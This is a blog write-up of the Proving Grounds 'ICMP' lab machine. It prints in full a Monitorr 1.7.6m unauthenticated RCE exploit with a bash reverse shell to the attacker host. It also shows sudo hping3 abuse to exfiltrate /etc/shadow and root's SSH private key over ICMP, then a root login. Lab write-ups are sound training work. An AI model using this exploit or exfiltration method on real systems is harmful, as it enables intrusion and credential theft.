<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 18/09/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: ICMP
Feel free to ping me
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/pg/icmp/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="Proving Grounds - ICMP"><meta property="og:description" content="ðŸ“† 18/09/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: ICMP
Feel free to ping me
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/pg/icmp/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="Proving Grounds - ICMP"><meta name=twitter:description content="ðŸ“† 18/09/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: ICMP
Feel free to ping me
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"Proving Grounds - ICMP","item":"https://geobour98.com/write-ups/pg/icmp/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Proving Grounds - ICMP","name":"Proving Grounds - ICMP","description":"ðŸ“† 18/09/2022 - geobour98 âŒš 7 min\nIntroduction This is a Proving Grounds room which can be found at: ICMP\nFeel free to ping me\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0.","keywords":[],"articleBody":"ðŸ“† 18/09/2022 - geobour98 âŒš 7 min\nIntroduction This is a Proving Grounds room which can be found at: ICMP\nFeel free to ping me\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0.06s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 20:39 Completed Parallel DNS resolution of 1 host. at 20:39, 0.00s elapsed Initiating Connect Scan at 20:39 Scanning 192.168.200.218 (192.168.200.218) [65535 ports] Discovered open port 80/tcp on 192.168.200.218 Discovered open port 22/tcp on 192.168.200.218 Completed Connect Scan at 20:39, 19.62s elapsed (65535 total ports) Nmap scan report for 192.168.200.218 (192.168.200.218) Host is up (0.058s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.200.218  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:43 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating Ping Scan at 20:43 Scanning 192.168.200.218 [4 ports] Completed Ping Scan at 20:43, 0.10s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 20:43 Completed Parallel DNS resolution of 1 host. at 20:43, 0.00s elapsed Initiating SYN Stealth Scan at 20:43 Scanning 192.168.200.218 (192.168.200.218) [2 ports] Discovered open port 80/tcp on 192.168.200.218 Discovered open port 22/tcp on 192.168.200.218 Completed SYN Stealth Scan at 20:43, 0.12s elapsed (2 total ports) Initiating Service scan at 20:43 Scanning 2 services on 192.168.200.218 (192.168.200.218) Completed Service scan at 20:43, 6.13s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.200.218 (192.168.200.218) Retrying OS detection (try #2) against 192.168.200.218 (192.168.200.218) Initiating Traceroute at 20:43 Completed Traceroute at 20:43, 0.06s elapsed Initiating Parallel DNS resolution of 1 host. at 20:43 Completed Parallel DNS resolution of 1 host. at 20:43, 0.00s elapsed NSE: Script scanning 192.168.200.218. Initiating NSE at 20:43 Completed NSE at 20:43, 1.93s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.23s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Nmap scan report for 192.168.200.218 (192.168.200.218) Host is up (0.059s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA) | 256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA) |_ 256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-title: Monitorr | Monitorr |_Requested resource was http://192.168.200.218/mon/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 (90%), Linux 2.6.32 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Synology DiskStation Manager 5.1 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 47.380 days (since Thu Jul 21 11:36:21 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 58.96 ms 192.168.49.1 (192.168.49.1) 2 58.32 ms 192.168.200.218 (192.168.200.218)  NSE: Script Post-scanning. Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.91 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 36 (2.872KB) Navigate to port 80 and at the bottom of the web page notice the version Monitorr 1.7.6m. Then put the version found on searchsploit. Command: searchsploit monitorr 1.7.6m\ngeobour98@kali:~$ searchsploit monitorr 1.7.6m ----------------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Monitorr 1.7.6m - Authorization Bypass | php/webapps/48981.py Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) | php/webapps/48980.py ----------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploitation Then, we can mirror the exploit: php/webapps/48980.py. Command: searchsploit -m php/webapps/48980.py\nDonâ€™t modify the script and it should look like this:\n#!/usr/bin/python # -*- coding: UTF-8 -*-  # Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) # Date: September 12, 2020 # Exploit Author: Lyhin's Lab # Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/ # Software Link: https://github.com/Monitorr/Monitorr # Version: 1.7.6m # Tested on: Ubuntu 19  import requests import os import sys  if len (sys.argv) != 4:  print (\"specify params in format: python \" + sys.argv[0] + \" target_url lhost lport\") else:  url = sys.argv[1] + \"/assets/php/upload.php\"  headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\", \"Accept\": \"text/plain, */*; q=0.01\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"X-Requested-With\": \"XMLHttpRequest\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------31046105003900160576454225745\", \"Origin\": sys.argv[1], \"Connection\": \"close\", \"Referer\": sys.argv[1]}   data = \"-----------------------------31046105003900160576454225745\\r\\nContent-Disposition: form-data; name=\\\"fileToUpload\\\"; filename=\\\"she_ll.php\\\"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a213213123\\\"/bin/bash -c 'bash -i \u0026 /dev/tcp/\"+sys.argv[2] +\"/\" + sys.argv[3] + \" 0\u00261'\\\");\\r\\n\\r\\n-----------------------------31046105003900160576454225745--\\r\\n\"   requests.post(url, headers=headers, data=data)   print (\"A shell script should be uploaded. Now we try to execute it\")  url = sys.argv[1] + \"/assets/data/usrimg/she_ll.php\"  headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}  requests.get(url, headers=headers) Then run the python script. Command: python 48980.py http://192.168.217.218/mon/ 192.168.49.217 443\ngeobour98@kali:~$ python 48980.py http://192.168.217.218/mon/ 192.168.49.217 443 A shell script should be uploaded. Now we try to execute it Before running it, open a netcat listener on 443 port.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.49.200] from (UNKNOWN) [192.168.200.218] 42540 bash: cannot set terminal process group (570): Inappropriate ioctl for device bash: no job control in this shell www-data@icmp:/var/www/html/mon/assets/data/usrimg$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 'import pty;pty.spawn(\"/bin/bash\")' www-data@icmp:/var/www/html/mon/assets/data/usrimg$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@icmp:/var/www/html/mon/assets/data/usrimg$ export TERM=xterm-256color www-data@icmp:/var/www/html/mon/assets/data/usrimg$ stty rows 38 cols 111 www-data@icmp:/var/www/html/mon/assets/data/usrimg$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Now, we have a reverse shell as the www-data user. There is an interesting file reminder in /home/fox/ with contents:\ncrypt with crypt.php: done, it works work on decrypt with crypt.php: howto?!? We try to find crypt.php in the filesystem, but no luck there. Then, we see an interesting folder devel in /home/fox/, where we have execute permissions but not read. Navigate there and try to open the file.\nwww-data@icmp:/home/fox$ find / -type f -name crypt.php 2/dev/null www-data@icmp:/home/fox$ cd devel www-data@icmp:/home/fox/devel$ cat crypt.php echo crypt('[REDACTED]','da'); ? www-data@icmp:/home/fox/devel$ The crypt function takes a string, which is the cleartext password ([REDACTED]) for the user fox, and a salt and then returns a hashed string. Now we can switch to user fox.\nwww-data@icmp:/home/fox/devel$ su fox Password: $ bash fox@icmp:~/devel$ id uid=1000(fox) gid=1000(fox) groups=1000(fox) fox@icmp:~/devel$ cd .. fox@icmp:~$ cat local.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute hping3 as root.\nfox@icmp:~$ sudo -l [sudo] password for fox: Matching Defaults entries for fox on icmp:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User fox may run the following commands on icmp:  (root) /usr/sbin/hping3 --icmp *  (root) /usr/bin/killall hping3 Unfortunately, we canâ€™t execute the sudo command for hping3 from https://gtfobins.github.io/gtfobins/hping3/#sudo, because of the necessary --icmp. Then, from the help menu of hping3 we identify 2 interesting parameters: -d (data from file) and -E (data from file).\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -h usage: hping3 host [options]  -h --help show this help [REDACTED] Common  -d --data data size (default is 0)  -E --file data from file  -e --sign add 'signature'  -j --dump dump packets in hex  -J --print dump printable characters  -B --safe enable 'safe' protocol  -u --end tell you when --file reached EOF and prevent rewind [REDACTED] With the parameters -d and -E we can exfiltrate data from files through icmp protocol. Command: sudo /usr/sbin/hping3 --icmp -d 1416 -E /etc/shadow 192.168.49.200\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d 1416 -E /etc/shadow 192.168.49.200 HPING 192.168.49.200 (ens160 192.168.49.200): icmp mode set, 28 headers + 1416 data bytes [main] memlockall(): Operation not supported Warning: can't disable memory paging! len=1444 ip=192.168.49.200 ttl=63 id=2130 icmp_seq=0 rtt=62.3 ms len=1444 ip=192.168.49.200 ttl=63 id=2238 icmp_seq=1 rtt=62.2 ms len=1444 ip=192.168.49.200 ttl=63 id=2292 icmp_seq=2 rtt=62.1 ms len=1444 ip=192.168.49.200 ttl=63 id=2508 icmp_seq=3 rtt=61.9 ms len=1444 ip=192.168.49.200 ttl=63 id=2619 icmp_seq=4 rtt=61.8 ms len=1444 ip=192.168.49.200 ttl=63 id=2647 icmp_seq=5 rtt=61.7 ms len=1444 ip=192.168.49.200 ttl=63 id=2794 icmp_seq=6 rtt=69.6 ms ^C --- 192.168.49.200 hping statistic --- 7 packets transmitted, 7 packets received, 0% packet loss round-trip min/avg/max = 61.7/63.1/69.6 ms Before running the hping3 command, we should run tcpdump to receive the contents of /etc/shadow.\ngeobour98@kali:~$ sudo tcpdump icmp -i tun0 -w icmp.pcap The output is saved on icmp.pcap, which can be opened with wireshark.\ngeobour98@kali:~$ wireshark icmp.pcap root:[REDACTED]:19195:0:99999:7::: daemon:*:18545:0:99999:7::: bin:*:18545:0:99999:7::: sys:*:18545:0:99999:7::: sync:*:18545:0:99999:7::: games:*:18545:0:99999:7::: man:*:18545:0:99999:7::: lp:*:18545:0:99999:7::: mail:*:18545:0:99999:7::: news:*:18545:0:99999:7::: uucp:*:18545:0:99999:7::: proxy:*:18545:0:99999:7::: www-data:*:18545:0:99999:7::: backup:*:18545:0:99999:7::: list:*:18545:0:99999:7::: irc:*:18545:0:99999:7::: gnats:*:18545:0:99999:7::: nobody:*:18545:0:99999:7::: _apt:*:18545:0:99999:7::: systemd-timesync:*:18545:0:99999:7::: systemd-network:*:18545:0:99999:7::: systemd-resolve:*:18545:0:99999:7::: messagebus:*:18545:0:99999:7::: sshd:*:18545:0:99999:7::: avahi:*:18545:0:99999:7::: saned:*:18545:0:99999:7::: colord:*:18545:0:99999:7::: hplip:*:18545:0:99999:7::: systemd-coredump:!!:18545:::::: fox:[REDACTED]:18599:0:99999:7::: Also before trying to crack the root hash, we can try to exfiltrate the private SSH key of root, if there is one. Command: sudo /usr/sbin/hping3 --icmp -d 1416 -E /root/.ssh/id_rsa 192.168.49.200\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d 1416 -E /root/.ssh/id_rsa 192.168.49.200 HPING 192.168.49.200 (ens160 192.168.49.200): icmp mode set, 28 headers + 1416 data bytes [main] memlockall(): Operation not supported Warning: can't disable memory paging! len=1444 ip=192.168.49.200 ttl=63 id=25397 icmp_seq=0 rtt=61.6 ms len=1444 ip=192.168.49.200 ttl=63 id=25460 icmp_seq=1 rtt=61.4 ms len=1444 ip=192.168.49.200 ttl=63 id=25639 icmp_seq=2 rtt=61.1 ms len=1444 ip=192.168.49.200 ttl=63 id=25839 icmp_seq=3 rtt=61.0 ms len=1444 ip=192.168.49.200 ttl=63 id=25890 icmp_seq=4 rtt=68.9 ms len=1444 ip=192.168.49.200 ttl=63 id=26060 icmp_seq=5 rtt=60.8 ms ^C --- 192.168.49.200 hping statistic --- 6 packets transmitted, 6 packets received, 0% packet loss round-trip min/avg/max = 60.8/62.5/68.9 ms Before running the hping3 command, we should run tcpdump to receive the contents of /root/.ssh/id_rsa.\ngeobour98@kali:~$ sudo tcpdump icmp -i tun0 -w ssh.pcap The output is saved on ssh.pcap, which can be opened with wireshark.\ngeobour98@kali:~$ wireshark ssh.pcap -----BEGIN OPENSSH PRIVATE KEY----- [REDACTED] -----END OPENSSH PRIVATE KEY----- Then we create a file id_rsa from the ssh.pcap, change itâ€™s permissions and ssh as root.\ngeobour98@kali:~$ chmod 600 id_rsa geobour98@kali:~$ ssh -i id_rsa root@192.168.200.218 Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Sep 6 18:31:36 2022 from 192.168.49.200 root@icmp:~# id uid=0(root) gid=0(root) groups=0(root) root@icmp:~# cat proof.txt [REDACTED] Proof of Concept (PoC image): linux web searchsploit python rwx sudo hping3 tcpdump icmp wireshark pcap exfiltration  ","wordCount":"1814","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/pg/icmp/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Proving Grounds - ICMP</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 18/09/2022 - geobour98<br>âŒš 7 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>Proving Grounds</strong> room which can be found at:
<a href=https://portal.offensive-security.com/labs/play target=_blank style=color:#e30f0f>ICMP</a></p><p>Feel free to ping me</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 192.168.200.218</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-06 20:39 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 20:39
</span></span><span style=display:flex><span>Scanning 192.168.200.218 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 20:39, 0.06s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:39
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:39, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 20:39
</span></span><span style=display:flex><span>Scanning 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.200.218
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.200.218
</span></span><span style=display:flex><span>Completed Connect Scan at 20:39, 19.62s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.058s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 19.73 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80 -v 192.168.200.218</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.200.218
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-06 20:43 EEST
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at 20:43
</span></span><span style=display:flex><span>Scanning 192.168.200.218 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 20:43, 0.10s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:43
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 20:43
</span></span><span style=display:flex><span>Scanning 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.200.218
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.200.218
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 20:43, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 20:43
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 20:43, 6.13s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 192.168.200.218 (192.168.200.218)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 192.168.200.218 (192.168.200.218)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 20:43
</span></span><span style=display:flex><span>Completed Traceroute at 20:43, 0.06s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:43
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 192.168.200.218.
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 1.93s elapsed
